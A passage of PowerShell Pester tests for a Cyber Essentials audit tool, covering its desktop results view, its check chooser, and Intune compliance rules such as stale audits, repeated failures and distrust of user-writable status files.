        $ui.AiAgentsGrid = [pscustomobject]@{ ItemsSource = $null; Visibility = '' }
        $ui.AiAgentsEmpty = [pscustomobject]@{ Visibility = ''; Text = '' }
        $ui.AiMcpGrid = [pscustomobject]@{ ItemsSource = $null; Visibility = '' }
        $ui.AiMcpEmpty = [pscustomobject]@{ Visibility = '' }
        $ui.AiMcpMeta = [pscustomobject]@{ Text = '' }
        $ui.AiEnvs = [pscustomobject]@{ Children = (New-Object System.Collections.ArrayList) }
        $ui.AiControlsLink = [pscustomobject]@{ Text = '' }
        $ui.AiLine = [pscustomobject]@{ Visibility = '' }
        $ui.AiLineText = [pscustomobject]@{ Text = '' }
        $ui.ActMeta = [pscustomobject]@{ Text = '' }
        $ui.OvEmpty = [pscustomobject]@{ Visibility = '' }
        $ui.OvBody = [pscustomobject]@{ Visibility = '' }
        $ui.StatusStack = [pscustomobject]@{ Child = $null }
        $ui.StatusLegend = [pscustomobject]@{ Children = (New-Object System.Collections.ArrayList) }
        $ui.ThemeFilter = [pscustomobject]@{ SelectedValue = '(all)' }
        $ui.StatusFilter = [pscustomobject]@{ SelectedValue = 'Needs action' }
        $ui.SearchBox = [pscustomobject]@{ Text = '' }

        Show-Results $script:guiResult
        $ui.TcGrid.ItemsSource.Count | Should -Be 5
        $ui.FindingCount.Text | Should -Match 'shown'
        $ui.SelCount.Text | Should -Match 'ticked'
        $ui.AiLine.Visibility | Should -Be 'Visible'
        $ui.AiLineText.Text | Should -Match 'AI tool'
        $ui.OvBody.Visibility | Should -Be 'Visible'
        $ui.VerdictText.Text | Should -Not -BeNullOrEmpty
        $ui.ChangesTab.Header | Should -Match '^Fixes \d+$'
        $ui.FwBars.Children.Count | Should -Be 3
        @($ui.AiAgentsGrid.ItemsSource).Count | Should -BeGreaterThan 0
        $ui.AiMcpEmpty.Visibility | Should -Be 'Visible'
        $ui.AiControlsLink.Text | Should -Match 'AI-related control'

        $ui.AiAgentsEmpty.Text | Should -Be 'No recognised AI tools found in this session.' -Because 'a posture with no scanComplete (an older save) counts as complete'

        # Places that were not read: the empty states say the scan is incomplete, and a line names them.
        $gone = [ordered]@{ agentsFound = 0; contained = $true; deviations = 0; agents = @(); environments = @(); scanComplete = $false
            notRead = @([ordered]@{ location = '%USERPROFILE%\.vscode\extensions'; kind = 'folder-listing'; reason = 'a symbolic link on the way is not followed by an elevated or SYSTEM audit (it could point off this computer)'; remedy = ''; topic = 'vscode'; needsUserSession = $true; count = 1 }) }
        Set-CEAiTab -Ai $gone -Findings $script:guiResult.Findings
        $ui.AiAgentsEmpty.Visibility | Should -Be 'Visible'
        $ui.AiAgentsEmpty.Text | Should -Match 'incomplete'
        @($ui.AiEnvs.Children) | Should -Contain 'No VMs, WSL distributions or containers found.' -Because 'VS Code extensions can not hide a virtual machine'
        @($ui.AiEnvs.Children | Where-Object { $_ -like 'BAD: Not read, so the AI tools found may be incomplete: %USERPROFILE%\.vscode\extensions*' }).Count | Should -Be 1
        # A VM file that was not read: the scan for AI tools is complete, but "no VMs" is not said.
        $vmOnly = [ordered]@{ agentsFound = 0; contained = $true; deviations = 0; agents = @(); environments = @(); scanComplete = $true
            notRead = @([ordered]@{ location = '%USERPROFILE%\VMs\a.vmx'; kind = 'file-content'; reason = 'it could not be read (IOException)'; remedy = ''; topic = 'vm-file'; needsUserSession = $false; count = 1 }) }
        $ui.AiEnvs.Children.Clear()
        Set-CEAiTab -Ai $vmOnly -Findings $script:guiResult.Findings
        $ui.AiAgentsEmpty.Text | Should -Be 'No recognised AI tools found in this session.'
        @($ui.AiEnvs.Children) | Should -Not -Contain 'No VMs, WSL distributions or containers found.'
        @($ui.AiEnvs.Children | Where-Object { $_ -like 'BAD: Not read (none of these could hide an AI tool*%USERPROFILE%\VMs\a.vmx*' }).Count | Should -Be 1
        # A browser whose installed files could not be checked gets its own explanation, not "could hide an AI tool".
        $browserOnly = [ordered]@{ agentsFound = 1; contained = $true; deviations = 0; agents = @(); environments = @(); scanComplete = $true
            notRead = @([ordered]@{ location = '%USERPROFILE%\AppData\Local\Google\Chrome\Application\chrome.exe'; kind = 'existence'; reason = 'a symbolic link on the way is not followed by an elevated or SYSTEM audit (it could point off this computer)'; remedy = ''; topic = 'browser-installed'; needsUserSession = $true; count = 1 }) }
        $ui.AiEnvs.Children.Clear()
        Set-CEAiTab -Ai $browserOnly -Findings $script:guiResult.Findings
        $line = @($ui.AiEnvs.Children | Where-Object { $_ -like 'BAD: *' })
        $line.Count | Should -Be 1
        $line[0] | Should -BeLike 'BAD: Whether these browsers are still installed could not be checked, so the AI extensions found in their profiles are listed as installed, though they may be left over from a browser that was removed: %USERPROFILE%\AppData\Local\Google\Chrome\Application\chrome.exe (existence)*'
        $line[0] | Should -Not -Match 'could hide an AI tool|may be incomplete'
        $browserOnly.notRead = @($browserOnly.notRead) + @($vmOnly.notRead)
        $ui.AiEnvs.Children.Clear()
        Set-CEAiTab -Ai $browserOnly -Findings $script:guiResult.Findings
        @($ui.AiEnvs.Children | Where-Object { $_ -like 'BAD: Not read (none of these could hide an AI tool*: %USERPROFILE%\VMs\a.vmx (file-content): *. Whether these browsers are still installed could not be checked*: %USERPROFILE%\AppData\Local\Google\Chrome\Application\chrome.exe*' }).Count | Should -Be 1
        $ui.AiEnvs.Children.Clear()
        Set-CEAiTab -Ai $gone -Findings $script:guiResult.Findings
        @($ui.AiEnvs.Children | Where-Object { $_ -like '*To read these, run the audit without elevation*' }).Count | Should -Be 1
        # A record the user's own session would not read either gets its own fix, not the elevation advice.
        $gone.notRead = @([ordered]@{ location = '%USERPROFILE%\AppData\Local\Vendor\Tool'; kind = 'existence'; reason = 'it could not be read (UnauthorizedAccessException)'
                remedy = 'Check the permissions on this folder, then run the audit again.'; topic = 'paths'; needsUserSession = $false; count = 1 })
        $ui.AiEnvs.Children.Clear()
        Set-CEAiTab -Ai $gone -Findings $script:guiResult.Findings
        $line = @($ui.AiEnvs.Children | Where-Object { $_ -like 'BAD: Not read*' })
        $line.Count | Should -Be 1
        $line[0] | Should -Match 'Check the permissions on this folder'
        $line[0] | Should -Not -Match 'without elevation|symbolic link'

        Show-Results (Import-SavedResults (Join-Path $script:guiOut 'findings.json'))
        $ui.ChangesGrid.ItemsSource.Count | Should -Be @($script:guiResult.Changeset.Items).Count
    }
}

Describe 'Desktop app: choosing checks' {
    BeforeAll {
        Set-TestDevice -Kind Secure
        $src = Get-Content (Join-Path $script:RepoRoot 'app\Start-CEAuditGui.ps1') -Raw
        $ast = [System.Management.Automation.Language.Parser]::ParseInput($src, [ref]$null, [ref]$null)
        $script:guiFunctions = @($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $false) | ForEach-Object { $_.Extent.Text })
        $script:allIds = @(Get-CECheck | ForEach-Object { $_.Id } | Sort-Object)
        $script:ceIds = @(Get-CECheck -Framework 'CE' | ForEach-Object { $_.Id } | Sort-Object)
    }
    BeforeEach {
        foreach ($fn in $script:guiFunctions) { . ([scriptblock]::Create($fn)) }
        $script:UiSettingsPath = Join-Path $TestDrive "settings-$([guid]::NewGuid().ToString('n')).json"
        function Write-UiLog { param($Text) }
    }

    It 'resolves ticked checks to All, the Cyber Essentials preset, or a custom choice' {
        (Resolve-UiCheckSelection -Ids $script:allIds).Mode | Should -Be 'All'
        (Resolve-UiCheckSelection -Ids $script:ceIds).Mode | Should -Be 'CE'
        $custom = Resolve-UiCheckSelection -Ids @('UA-10', 'FW-01', 'FW-01', 'XX-99')
        $custom.Mode | Should -Be 'Custom'
        $custom.Ids | Should -Be @('FW-01', 'UA-10') -Because 'duplicates and unknown ids are dropped, and ids are sorted'
        (Resolve-UiCheckSelection -Ids @()).Mode | Should -Be 'Custom'
        @((Resolve-UiCheckSelection -Ids @()).Ids).Count | Should -Be 0
    }

    It 'works out theme tick boxes: all, none or partly ticked' {
        $ids = @('FW-01', 'FW-02', 'FW-03')
        Get-UiThemeTickState -ThemeIds $ids -Ticked @{ 'FW-01' = $true; 'FW-02' = $true; 'FW-03' = $true } | Should -BeTrue
        Get-UiThemeTickState -ThemeIds $ids -Ticked @{ 'FW-01' = $false } | Should -BeFalse
        Get-UiThemeTickState -ThemeIds $ids -Ticked @{ 'FW-02' = $true } | Should -BeNullOrEmpty
    }

    It 'describes the choice for the toolbar' {
        Get-UiSelectionText ([pscustomobject]@{ Mode = 'All'; Ids = $script:allIds }) | Should -Be "All $($script:allIds.Count) checks"
        Get-UiSelectionText ([pscustomobject]@{ Mode = 'CE'; Ids = $script:ceIds }) | Should -Be "Cyber Essentials only ($($script:ceIds.Count) checks)"
        Get-UiSelectionText ([pscustomobject]@{ Mode = 'Custom'; Ids = @('FW-01', 'UA-10') }) | Should -Be "2 of $($script:allIds.Count) checks"
    }

    It 'groups checks by control theme in report order' {
        $groups = Get-UiCheckGroup
        ($groups | ForEach-Object { $_.Id }) | Should -Be @('Firewalls', 'SecureConfiguration', 'SecurityUpdateManagement', 'UserAccessControl', 'MalwareProtection', 'NCSCHardening')
        @($groups | ForEach-Object { $_.Checks } | ForEach-Object { $_.Id }).Count | Should -Be $script:allIds.Count
        ($groups[0].Checks | ForEach-Object { $_.Id }) | Should -Be @('FW-01', 'FW-02', 'FW-03', 'FW-04', 'FW-05', 'FW-06', 'FW-07')
    }

    It 'saves and reloads the choice, dropping checks that no longer exist' {
        (Read-UiCheckSelection).Mode | Should -Be 'All' -Because 'there is no settings file yet'
        Save-UiCheckSelection ([pscustomobject]@{ Mode = 'Custom'; Ids = @('FW-01', 'UA-10') })
        $back = Read-UiCheckSelection
        $back.Mode | Should -Be 'Custom'
        $back.Ids | Should -Be @('FW-01', 'UA-10')

        Save-UiCheckSelection ([pscustomobject]@{ Mode = 'CE'; Ids = $script:ceIds })
        (Read-UiCheckSelection).Mode | Should -Be 'CE'

        Set-Content -LiteralPath $script:UiSettingsPath -Value '{ "checkSelection": { "mode": "Custom", "ids": ["ZZ-01", "ZZ-02"] } }'
        (Read-UiCheckSelection).Mode | Should -Be 'All' -Because 'a choice with no known checks falls back to all'
        Set-Content -LiteralPath $script:UiSettingsPath -Value '{ not json'
        (Read-UiCheckSelection).Mode | Should -Be 'All'
    }

    It 'the chooser window layout is valid XAML' {
        $src = Get-Content (Join-Path $script:RepoRoot 'app\Start-CEAuditGui.ps1') -Raw
        $start = $src.IndexOf("`$chooserXaml = @'") + 17
        $end = $src.IndexOf("'@", $start)
        [xml]$doc = $src.Substring($start, $end - $start).Trim()
        foreach ($n in 'AllBtn', 'CeBtn', 'ClearBtn', 'SearchBox', 'CancelBtn', 'OkBtn', 'CountText', 'AdminText', 'Tree') {
            @($doc.SelectNodes("//*[@*[local-name()='Name']='$n']")).Count | Should -Be 1 -Because "Show-CheckChooser looks up $n"
        }
    }
}

Describe 'Intune: status, discovery and compliance rules' {
    BeforeAll {
        $script:intune = Join-Path $script:RepoRoot 'intune'
        . (Join-Path $script:intune 'Discover-CECompliance.ps1')
        $script:strictRules = Join-Path $script:intune 'compliance-rules.json'
        $script:softRules = Join-Path $script:intune 'compliance-rules-autofail-only.json'
        $script:fwRules = Join-Path $script:intune 'compliance-rules-frameworks.json'

        function global:Get-TestInstallerCode {
            <# The named functions (or variable assignments) from the install script, to dot-source into a test. #>
            param([string]$Path, [string[]]$Name = @(), [string[]]$Variable = @())
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($Path, [ref]$null, [ref]$null)
            $parts = foreach ($n in $Name) {
                $fn = $ast.Find({ param($x) $x -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $x.Name -eq $n }.GetNewClosure(), $true)
                if (-not $fn) { throw "No function $n in $Path" }
                $fn.Extent.Text
            }
            $parts = @($parts) + @(foreach ($v in $Variable) {
                $set = $ast.Find({ param($x) $x -is [System.Management.Automation.Language.AssignmentStatementAst] -and "$($x.Left)" -eq "`$$v" }.GetNewClosure(), $false)
                if (-not $set) { throw "No variable $v in $Path" }
                $set.Extent.Text
            })
            return [scriptblock]::Create(($parts -join "`n"))
        }

        function global:New-TestStatus {
            param([string]$Kind, [string]$DataRoot, [switch]$AttestMfa)
            Set-TestDevice -Kind $Kind
            if ($AttestMfa) {
                InModuleScope CEAudit {
                    $cfg = Get-CEConfig
                    $cfg.'cloud-services' = [pscustomobject]@{
                        maxAttestationAgeDays = 365
                        services = @([pscustomobject]@{ name = 'Microsoft 365 / Entra ID'; mfaEnforced = $true; adminMfaEnforced = $true; verifiedOn = (Get-Date).ToString('yyyy-MM-dd'); verifiedBy = 'IT' })
                        detectionHints = $cfg.'cloud-services'.detectionHints
                    }
                }
            }
            $f = @(Invoke-CEAuditCore)
            $summary = Get-CESummary -Findings $f
            $status = ConvertTo-CEStatus -Findings $f -Summary $summary -Context $global:CETestCtx -ReportFolder 'X'
            New-Item -ItemType Directory -Path $DataRoot -Force | Out-Null
            Write-CEStatus -Status $status -Path (Join-Path $DataRoot 'status.json') | Out-Null
            if ($AttestMfa) { InModuleScope CEAudit { Get-CEConfig -Force | Out-Null } }
            return $status
        }
    }

    It 'builds a status document with worst status per check' {
        $root = Join-Path $TestDrive 'insecure'
        $st = New-TestStatus -Kind Insecure -DataRoot $root
        $st.schemaVersion | Should -Be 1
        $st.platform | Should -Be 'windows'
        $st.autoFailCount | Should -BeGreaterThan 0
        $st.checks.'SU-05'.status | Should -Be 'Fail'
        $st.checks.'SU-05'.scope | Should -Be 'Machine'
        $st.checks.'UA-07'.status | Should -Be 'Manual'
        $st.frameworks.'ce-v3.3'.metPct | Should -BeLessThan 100
        $st.autoFails | Should -Contain 'SU-03'
        (Get-Content (Join-Path $root 'status.json') -Raw | ConvertFrom-Json).autoFailCount | Should -Be $st.autoFailCount
    }

    It 'derives per-framework rollups from self-describing checks and carries no verdict' {
        Set-TestDevice -Kind Insecure
        $f = @(Invoke-CEAuditCore)
        $summary = Get-CESummary -Findings $f
        $map = Get-CEStatusCheckMap -Findings $f
        $map.'FW-01'.scope | Should -Be 'Machine'
        @($map.'FW-01'.frameworks) | Should -Not -BeNullOrEmpty
        $roll = Get-CEFrameworkRollup -CheckMap $map -Summary $summary
        ($roll.'ce-v3.3'.met + $roll.'ce-v3.3'.attention + $roll.'ce-v3.3'.confirm) | Should -Be $roll.'ce-v3.3'.applicable
        $roll.'ce-v3.3'.metPct | Should -BeGreaterOrEqual 0
        $roll.'ce-v3.3'.metPct | Should -BeLessOrEqual 100
        $roll.'ce-plus'.total | Should -Be 5
        $st = ConvertTo-CEStatus -Findings $f -Summary $summary -Context $global:CETestCtx
        @($st.PSObject.Properties.Name) | Should -Not -Contain 'Verdict'
        $st.scope | Should -Be 'Machine'
    }

    It 'discovery output is one line of JSON with every rule setting and the right types' {
        $root = Join-Path $TestDrive 'insecure2'
        New-TestStatus -Kind Insecure -DataRoot $root | Out-Null
        $json = Get-CEComplianceData -DataRoot $root -Installed $true -Elevated $false -NoKick | ConvertTo-Json -Compress
        $json | Should -Not -Match "`n"
        foreach ($rules in @($script:strictRules, $script:softRules, $script:fwRules)) {
            $eval = Test-CEComplianceRules -DiscoveryOutput $json -RulesPath $rules
            $eval.Problems | Should -BeNullOrEmpty
            @($eval.Rules | Where-Object { @('NotDiscovered', 'TypeError') -contains $_.State }).Count | Should -Be 0
        }
    }

    It 'framework rules gate on coverage: an insecure device is non-compliant, naming CEv33MetPct' {
        $root = Join-Path $TestDrive 'fw-insecure'
        New-TestStatus -Kind Insecure -DataRoot $root | Out-Null
        $data = Get-CEComplianceData -DataRoot $root -Installed $true -Elevated $false -NoKick
        $data.CEv33MetPct | Should -BeGreaterOrEqual 0
        $eval = Test-CEComplianceRules -DiscoveryOutput ($data | ConvertTo-Json -Compress) -RulesPath $script:fwRules
        $eval.Compliant | Should -BeFalse
        @($eval.Rules | Where-Object State -eq 'NonCompliant').SettingName | Should -Contain 'CEv33MetPct'
    }

    It 'reports an insecure device as non-compliant, naming the failing rules' {
        $root = Join-Path $TestDrive 'insecure3'
        New-TestStatus -Kind Insecure -DataRoot $root | Out-Null
        $data = Get-CEComplianceData -DataRoot $root -Installed $true -Elevated $false -NoKick
        $data.CEAutoFailCount | Should -BeGreaterThan 0
        $data.CEPatchingOK | Should -BeFalse
        $data.CEFailing | Should -Match 'SU-03'
        $eval = Test-CEComplianceRules -DiscoveryOutput ($data | ConvertTo-Json -Compress) -RulesPath $script:softRules
        $eval.Compliant | Should -BeFalse
        $bad = @($eval.Rules | Where-Object State -eq 'NonCompliant').SettingName
        $bad | Should -Contain 'CEAutoFailCount'
        $bad | Should -Contain 'CEAntimalwareOK'
        ($eval.Rules | Where-Object SettingName -eq 'CEAutoFailCount').Detail | Should -Match '^This device has \d+ issue'
    }

    It 'reports a hardened, attested device as compliant under the strict rules' {
        $root = Join-Path $TestDrive 'secure'
        $st = New-TestStatus -Kind Secure -DataRoot $root -AttestMfa
        $st.autoFailCount | Should -Be 0
        $data = Get-CEComplianceData -DataRoot $root -Installed $true -Elevated $false -NoKick
        $eval = Test-CEComplianceRules -DiscoveryOutput ($data | ConvertTo-Json -Compress) -RulesPath $script:strictRules
        ($eval.Rules | Where-Object State -ne 'Compliant' | ForEach-Object { "$($_.SettingName)=$($_.Actual)" }) -join ', ' | Should -BeNullOrEmpty
        $eval.Compliant | Should -BeTrue
    }

    It 'is non-compliant when the audit is stale' {
        $root = Join-Path $TestDrive 'stale'
        New-TestStatus -Kind Secure -DataRoot $root -AttestMfa | Out-Null
        $data = Get-CEComplianceData -DataRoot $root -Installed $true -Elevated $false -NoKick -Now ([datetime]::UtcNow.AddHours(100))
        $data.CEAuditAgeHours | Should -BeGreaterOrEqual 100
        $eval = Test-CEComplianceRules -DiscoveryOutput ($data | ConvertTo-Json -Compress) -RulesPath $script:softRules
        @($eval.Rules | Where-Object State -eq 'NonCompliant').SettingName | Should -Be @('CEAuditAgeHours')
    }

    It 'one failed audit stays compliant; three in a row, or two over 72 hours, do not; a success resets the count' {
        # A single transient failure never flips compliance, a stale result does (CEAuditAgeHours), and
        # so does an audit that keeps failing: 3 runs in a row, or 2 or more over 72 hours.
        function global:Add-TestAuditFailure {
            param([string]$Root, [datetime]$At)
            InModuleScope CEAudit -Parameters @{ Root = $Root; At = $At } {
                param($Root, $At)
                Mock Test-CEIsAdmin { $false }
                Write-CEAuditFailure -DataRoot $Root -Message 'The audit failed' -Now $At
            }
        }
        function global:Get-TestFailureVerdict {
            param([string]$Root, [datetime]$At, [string]$RulesPath)
            $data = Get-CEComplianceData -DataRoot $Root -Installed $true -Elevated $false -NoKick -Now $At
            $eval = Test-CEComplianceRules -DiscoveryOutput ($data | ConvertTo-Json -Compress) -RulesPath $RulesPath
            [pscustomobject]@{ Data = $data; Compliant = $eval.Compliant; NonCompliant = @($eval.Rules | Where-Object State -eq 'NonCompliant' | ForEach-Object { $_.SettingName }) }
        }
        $root = Join-Path $TestDrive 'failed-runs'
        New-TestStatus -Kind Secure -DataRoot $root -AttestMfa | Out-Null
        $now = [datetime]::UtcNow
        $errPath = Join-Path $root 'last-error.json'

        $v = Get-TestFailureVerdict -Root $root -At $now -RulesPath $script:strictRules
        $v.Data.CEAuditFailedRuns | Should -Be 0
        $v.Data.CEAuditFailingHours | Should -Be 0
        $v.Compliant | Should -BeTrue

        # One failed run: reported (CEAuditError), but compliance does not change.
        $r = Add-TestAuditFailure -Root $root -At $now.AddHours(-2)
        $r.FailedRuns | Should -Be 1
        $v = Get-TestFailureVerdict -Root $root -At $now -RulesPath $script:strictRules
        $v.Data.CEAuditError | Should -BeTrue
        $v.Data.CEAuditFailedRuns | Should -Be 1
        $v.Data.CEAuditFailingHours | Should -Be 0 -Because 'the hours only count once at least 2 runs have failed'
        $v.Compliant | Should -BeTrue -Because 'one failed run never flips compliance'

        # Two in a row, 2 hours apart: still compliant.
        Add-TestAuditFailure -Root $root -At $now.AddHours(-1) | Out-Null
        $v = Get-TestFailureVerdict -Root $root -At $now -RulesPath $script:strictRules
        $v.Data.CEAuditFailedRuns | Should -Be 2
        $v.Data.CEAuditFailingHours | Should -Be 2
        $v.Compliant | Should -BeTrue

        # Three in a row: not compliant, under every rules file, before the result goes stale.
        $r = Add-TestAuditFailure -Root $root -At $now
        $r.FailedRuns | Should -Be 3
        $saved = Get-Content -LiteralPath $errPath -Raw | ConvertFrom-Json
        $saved.FailedRuns | Should -Be 3
        $first = if ($saved.FirstFailure -is [datetime]) { $saved.FirstFailure.ToUniversalTime() } else { [datetime]::Parse($saved.FirstFailure, [Globalization.CultureInfo]::InvariantCulture, [Globalization.DateTimeStyles]::RoundtripKind).ToUniversalTime() }
        $first | Should -Be $now.AddHours(-2) -Because 'the first failure since the last success is carried over'
        $v = Get-TestFailureVerdict -Root $root -At $now -RulesPath $script:strictRules
        $v.Data.CEAuditAgeHours | Should -BeLessThan 72
        $v.NonCompliant | Should -Be @('CEAuditFailedRuns')
        ($v.Data | ConvertTo-Json -Compress) | Should -Match '"CEAuditFailedRuns":3'
        foreach ($rules in @($script:softRules, $script:fwRules)) {
            (Get-TestFailureVerdict -Root $root -At $now -RulesPath $rules).NonCompliant | Should -Contain 'CEAuditFailedRuns'
        }

        # A successful audit removes last-error.json, so both counts start again.
        InModuleScope CEAudit -Parameters @{ Root = $root } { param($Root) Mock Test-CEIsAdmin { $false }; Clear-CEAuditFailure -DataRoot $Root }
        Test-Path -LiteralPath $errPath | Should -BeFalse
        $v = Get-TestFailureVerdict -Root $root -At $now -RulesPath $script:strictRules
        $v.Data.CEAuditFailedRuns | Should -Be 0
        $v.Compliant | Should -BeTrue
        (Add-TestAuditFailure -Root $root -At $now).FailedRuns | Should -Be 1 -Because 'the count starts again after a success'
        InModuleScope CEAudit -Parameters @{ Root = $root } { param($Root) Mock Test-CEIsAdmin { $false }; Clear-CEAuditFailure -DataRoot $Root }

        # Two failed runs over 72 hours with no success between: not compliant. (status.json is kept fresh
        # here so only this rule is tested; on a real device the audit age has usually passed 72 too, but
        # this rule still holds when an administrator relaxes the audit-age limit.)
        Add-TestAuditFailure -Root $root -At $now.AddHours(-80) | Out-Null
        $v = Get-TestFailureVerdict -Root $root -At $now -RulesPath $script:strictRules
        $v.Data.CEAuditFailingHours | Should -Be 0 -Because 'one failed run, however long ago, is not a run of failures'
        $v.Compliant | Should -BeTrue
        Add-TestAuditFailure -Root $root -At $now.AddHours(-1) | Out-Null
        $v = Get-TestFailureVerdict -Root $root -At $now -RulesPath $script:strictRules
        $v.Data.CEAuditFailedRuns | Should -Be 2
        $v.Data.CEAuditFailingHours | Should -Be 80
        $v.NonCompliant | Should -Be @('CEAuditFailingHours')
        foreach ($rules in @($script:softRules, $script:fwRules)) {
            (Get-TestFailureVerdict -Root $root -At $now -RulesPath $rules).NonCompliant | Should -Contain 'CEAuditFailingHours'
        }
        # Just under 72 hours is still compliant.
        $v = Get-TestFailureVerdict -Root $root -At $now.AddHours(-9) -RulesPath $script:softRules
        $v.Data.CEAuditFailingHours | Should -Be 71
        $v.NonCompliant | Should -Not -Contain 'CEAuditFailingHours'

        # A last-error.json from before failures were counted (or the user probe's shape) is one failed run.
        Set-Content -LiteralPath $errPath -Value ('{ "Time": "' + $now.AddHours(-5).ToString('o') + '", "Message": "Access to the path is denied." }')
        $v = Get-TestFailureVerdict -Root $root -At $now -RulesPath $script:strictRules
        $v.Data.CEAuditFailedRuns | Should -Be 1
        $v.Compliant | Should -BeTrue
        $r = Add-TestAuditFailure -Root $root -At $now
        $r.FailedRuns | Should -Be 2
        $r.FirstFailure | Should -Be $now.AddHours(-5).ToString('o') -Because 'its Time is the first failure'
        # Unreadable counts as one failed run too, never as a pass or a crash.
        Set-Content -LiteralPath $errPath -Value 'not json'
        (Get-CEComplianceData -DataRoot $root -Installed $true -Elevated $false -NoKick -Now $now).CEAuditFailedRuns | Should -Be 1
        Remove-Item -LiteralPath $errPath
    }

    It 'every rules file flags repeated audit failures and leaves CEAuditError for reporting' {
        foreach ($f in @($script:strictRules, $script:softRules, $script:fwRules)) {
            $rules = @((Get-Content -LiteralPath $f -Raw | ConvertFrom-Json).Rules)
            $runs = @($rules | Where-Object SettingName -eq 'CEAuditFailedRuns')
            $runs.Count | Should -Be 1 -Because $f
            $runs[0].Operator | Should -Be 'LessThan'
            $runs[0].DataType | Should -Be 'Int64'
            $runs[0].Operand | Should -Be 3
            $runs[0].RemediationStrings[0].Title | Should -Match '\{ActualValue\} times in a row'
            $hours = @($rules | Where-Object SettingName -eq 'CEAuditFailingHours')
            $hours.Count | Should -Be 1 -Because $f
            $hours[0].Operator | Should -Be 'LessThan'
            $hours[0].DataType | Should -Be 'Int64'
            $hours[0].Operand | Should -Be 72
            $hours[0].RemediationStrings[0].Title | Should -Match '\{ActualValue\} hours'
            @($rules | Where-Object SettingName -eq 'CEAuditAgeHours').Count | Should -Be 1 -Because 'a stale result still flips compliance'
            @($rules | Where-Object SettingName -eq 'CEAuditError').Count | Should -Be 0 -Because 'one failed run must not flip compliance'
        }
    }

    It 'compliance scripts treat a last-error.json a standard user could have written like an untrusted status.json' {
        # A user who could change last-error.json could reset the count of failed audits, so as SYSTEM it
        # gets the same trust check as status.json, and failing it reports no trustworthy data at all.
        $root = Join-Path $TestDrive 'trust-last-error'
        New-TestStatus -Kind Secure -DataRoot $root -AttestMfa | Out-Null
        $errPath = Join-Path $root 'last-error.json'
        [ordered]@{ Time = [datetime]::UtcNow.ToString('o'); Message = 'x'; Where = ''; FailedRuns = 1; FirstFailure = [datetime]::UtcNow.ToString('o') } |
            ConvertTo-Json | Set-Content -LiteralPath $errPath -Encoding UTF8
        $locked = @(
            [pscustomobject]@{ IdentityReference = [Security.Principal.SecurityIdentifier]::new('S-1-5-18'); FileSystemRights = [Security.AccessControl.FileSystemRights]::FullControl; AccessControlType = [Security.AccessControl.AccessControlType]::Allow }
            [pscustomobject]@{ IdentityReference = [Security.Principal.SecurityIdentifier]::new('S-1-5-32-544'); FileSystemRights = [Security.AccessControl.FileSystemRights]::FullControl; AccessControlType = [Security.AccessControl.AccessControlType]::Allow }
        )
        $global:TestLastErrorOwner = 'S-1-5-18'
        $global:TestLockedRules = $locked
        Mock Get-Acl {
            $owner = if ($LiteralPath -like '*last-error.json') { $global:TestLastErrorOwner } else { 'S-1-5-18' }
            $acl = New-Object psobject
            $acl | Add-Member -MemberType ScriptMethod -Name GetOwner -Value ([scriptblock]::Create("param(`$type) [Security.Principal.SecurityIdentifier]::new('$owner')"))
            $acl | Add-Member -MemberType ScriptMethod -Name GetAccessRules -Value { param($explicit, $inherited, $type) $global:TestLockedRules }
            return $acl
        }
        Get-CEStatusTrustProblem -DataRoot $root | Should -BeNullOrEmpty
        $data = Get-CEComplianceData -DataRoot $root -Installed $true -Elevated $true -NoKick
        $data.CEAuditFailedRuns | Should -Be 1
        (Test-CEComplianceRules -DiscoveryOutput ($data | ConvertTo-Json -Compress) -RulesPath $script:strictRules).Compliant | Should -BeTrue

        $global:TestLastErrorOwner = 'S-1-5-21-1-2-3-1001'
        Get-CEStatusTrustProblem -DataRoot $root | Should -Match 'last-error\.json is owned by S-1-5-21-1-2-3-1001'
        $data = Get-CEComplianceData -DataRoot $root -Installed $true -Elevated $true -NoKick
        $data.CEAuditFailedRuns | Should -Be 99999
        $data.CEAuditFailingHours | Should -Be 99999
        $data.CEAutoFailCount | Should -Be -1 -Because 'an untrusted data folder counts as no data, as for status.json'
        $eval = Test-CEComplianceRules -DiscoveryOutput ($data | ConvertTo-Json -Compress) -RulesPath $script:softRules
        $eval.Compliant | Should -BeFalse
        $bad = @($eval.Rules | Where-Object State -eq 'NonCompliant' | ForEach-Object { $_.SettingName })
        $bad | Should -Contain 'CEAuditFailedRuns'
        $bad | Should -Contain 'CEAuditFailingHours'
        # A standard user running it can only mislead themselves, so it is read as it is.
        (Get-CEComplianceData -DataRoot $root -Installed $true -Elevated $false -NoKick).CEAuditFailedRuns | Should -Be 1
    }

    It 'compliance scripts read JSON as UTF-8, so Windows PowerShell 5.1 reads non-ASCII text in a file without a BOM' {
        foreach ($file in @('Detect-CECompliance.ps1', 'Discover-CECompliance.ps1', 'Remediate-CECompliance.ps1')) {
            $ast = [System.Management.Automation.Language.Parser]::ParseFile((Join-Path $script:intune $file), [ref]$null, [ref]$null)
            $reads = @($ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] -and $n.GetCommandName() -eq 'Get-Content' }, $true))
            $reads.Count | Should -BeGreaterThan 0 -Because "$file reads JSON"
            foreach ($read in $reads) { $read.Extent.Text | Should -Match '-Encoding UTF8\b' -Because "$file line $($read.Extent.StartLineNumber)" }
        }
        $root = Join-Path $TestDrive 'utf8-status'
        New-Item -ItemType Directory -Path $root -Force | Out-Null
        $name = 'SU-' + [char]0x00E9 + [char]0x00FC + [char]0x4E2D
        $json = [ordered]@{ SchemaVersion = 1; AuditTime = [datetime]::UtcNow.ToString('o'); toolVersion = "1.0.0-$name"; autoFailCount = 1; autoFails = @($name); checks = [ordered]@{} } | ConvertTo-Json -Depth 4
        [IO.File]::WriteAllText((Join-Path $root 'status.json'), $json, (New-Object Text.UTF8Encoding($false)))
        $data = Get-CEComplianceData -DataRoot $root -Installed $true -Elevated $false -NoKick
        $data.CEToolVersion | Should -BeExactly "1.0.0-$name"
        $data.CEFailing | Should -BeExactly $name
    }

    It 'never reports compliant when nothing is installed or no audit has run' {
        $data = Get-CEComplianceData -DataRoot (Join-Path $TestDrive 'empty') -Installed $false -Elevated $false -NoKick
        $data.CEAutoFailCount | Should -Be -1
        foreach ($rules in @($script:strictRules, $script:softRules)) {
            (Test-CEComplianceRules -DiscoveryOutput ($data | ConvertTo-Json -Compress) -RulesPath $rules).Compliant | Should -BeFalse
        }
    }

    It 'the rules evaluator flags missing settings and type mismatches' {
